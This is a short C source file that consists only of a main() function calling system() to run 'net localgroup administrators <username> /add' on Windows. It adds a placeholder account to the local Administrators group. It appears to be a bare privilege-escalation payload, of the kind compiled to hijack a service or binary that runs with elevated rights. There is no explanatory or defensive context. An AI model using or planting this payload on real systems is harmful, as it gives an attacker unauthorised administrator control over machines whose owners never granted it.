#include <stdlib.h>
int main ()
{
    int i;
    i=system ("net localgroup administrators <username> /add");
    return 0;
}
